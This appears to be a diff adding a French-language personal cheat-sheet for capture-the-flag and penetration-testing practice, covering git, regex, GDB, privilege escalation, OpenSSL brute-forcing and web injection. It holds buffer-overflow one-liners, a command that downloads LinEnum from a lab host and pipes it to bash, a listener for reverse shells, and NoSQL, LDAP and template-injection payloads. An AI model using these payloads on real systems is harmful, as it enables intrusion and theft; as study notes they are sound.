@@ -1,0 +1,138 @@
+------------------------------------------------------------------------------------------
+					FISHINGIG
+------------------------------------------------------------------------------------------
+goldfish 
+
+------------------------------------------------------------------------------------------
+		  			  GIT
+------------------------------------------------------------------------------------------
+
+ssh-add ~/.ssh/git	-- add la clef ssh pour ne pas avoir a utiliser username/password a chaque fois
+			-- ne marche pas si on clone as https
+
+git diff > fix.patch 	-- save le diff dans un fichier --
+git reset --hard	-- nous remet a "head" --
+git checkout master	-- nous replace sur la branche master --
+git pull 		-- recupere les dernieres updates --
+git checkout "work"	-- replace sur la branche en developpement --
+git merge "master"	-- propose un merge a branch
+git pull		-- on pull again --
+patch -p1 < fix.patch	-- on applique le patch precedement cree --
+git add . 		-- add tout les fichiers --
+git commit -m "bla"	-- le commit --
+git push		-- here we go --
+
+------------------------------------------------------------------------------------------
+					FORENSIC
+------------------------------------------------------------------------------------------
+
+tsurugi lab 		-- a tester --
+
+------------------------------------------------------------------------------------------
+				    REGGEX SUBLIME
+------------------------------------------------------------------------------------------
+()	=> cree un bloc ($1)
+[]	=> les caracteres a chercher sont a l'interieur
+* 	=> en boucle minimum 0
++ 	=> en boucle minimum 1
+^	=> tant qu'on a pas (carac suivant)
+.+ 	=> tout tant qu'on a pas de newline
+
+examples :
+	(pub fn) ([a-z_]*)([^:\n]+):([a-zA-Z-]+)([ u0-9]*) .+
+
+
+
+------------------------------------------------------------------------------------------
+		   			GDB
+------------------------------------------------------------------------------------------
+
+P 	=> Adresse d'une fonction
+si 	=> instruction suivante
+finish  => fin de la fonction courante
+
+x/(?1)wx (?2) => print (?2) le nombre de cases memoires suivant l'instruction (?2)	
+examples :
+	 x/30wx $esp
+	--  print les 30 cases memoires suivantes de $esp --
+	
+	(perl -e 'print "A"x128 . "wathever"' ; cat) | ./ch15
+	-- le cat permet de ne pas fermer le pipe et d'y envoier l'entree standard --
+	
+	{ python -c 'from struct import pack ; print "B"*280 + pack ("<Q", 0x4005e7)' ; cat' } | ./ch35
+	-- autre implementation en python pour du x64 (<Q) pour ecrire l'adresse en little endian --
+
+	(python -c 'print chr(0x08)*4 + "\xbc\xfa\xff\xbf"' ; cat ) | ./ch16
+	-- x86 chr() pour ecrire de l'hexa --
+
+
+
+------------------------------------------------------------------------------------------
+         			  BASH
+------------------------------------------------------------------------------------------
+
+--noprofile
+	Do  not  read  either  the system-wide startup file /etc/profile or any of the personal
+        initialization files ~/.bash_profile, ~/.bash_login, or ~/.profile.  By  default,  bash
+             reads these files when it is invoked as a login shell (see INVOCATION below).
+
+--norc Do  not  read  and execute the system wide initialization file /etc/bash.bashrc and the
+        personal initialization file ~/.bashrc if the shell is interactive.  This option is  on 
+	by default if the shell is invoked as sh.
+
+------------------------------------------------------------------------------------------
+				PRIVESC
+------------------------------------------------------------------------------------------
+
+ReverseShell : https://highon.coffee/blog/reverse-shell-cheat-sheet/
+
+		-- Get proper TTY shell --
+
+python -c 'import pty; pty.spawn("/bin/bash")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+export TERM=screen
+ctrl + z 
+stty raw -echo
+nc -lvnp $PORT(retour au shell)
+			
+	--------------------------------
+
+python -m SimpleHTTPServer i				-- simpleHTTPServer --
+
+curl 10.10.14.249:9999/LinEnum.sh | bash      		-- curl a file --
+wget -O LinEnum.sh 10.10.14.249:9999			-- wget a file --
+
+ps auxi							-- list process --
+getcap -r / 2>/dev/null    				-- capabilitée des binaires --
+file "yolo"						-- fichier a analyser --
+find / -perm -4000 -exec ls -l {} \; 2>/dev/null        -- trouver les SUID --
+
+sh -i /home/nobody/.ssh/ssh_key USER@IP -t bash --noprofile --norci -- lancer un bash sans profile 
+								    -- prédefini (bashrc ...) --
+
+------------------------------------------------------------------------------------------
+				CRYPTO
+------------------------------------------------------------------------------------------
+
+cat file | 
+
+Decoder openssl -salted 
+bruteforce-salted-openssl -t 6 -f ~/Téléchargements/rockyou.txt -c AES-256-CBC -d SHA256 decoded_drupal.txt -1
+
+Encoder en openssl
+openssl enc -in LEFICHIERDENTREE -out LEFICHIERDESORTIE -d -AES-256-CBC -md sha256 -pass 'pass:LEPASSQUETATROUVE'
+
+--------------------------DIVERS------------------------------
+
+LDAP injection tester username avec ) si error username=* pass=*)(& 
+
+nosql
+NOSQL usr_name[$ne]=h4cker&usr_password[$ne]=abc [$ne] == OK
+NOSQL usr_name[$regex]=.{1}&usr_password[$ne]=abc a utiliser regex jusqu'a la bonne taille puis insérer les caracteres avant le . qui veut dire "tout"
+
+template injection 
+https://portswigger.net/blog/server-side-template-injection 
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("cat SECRET_FLAG.txt") }
+
+		---- ON DIS DECHIFFRER BORDEL DE MERDE ----
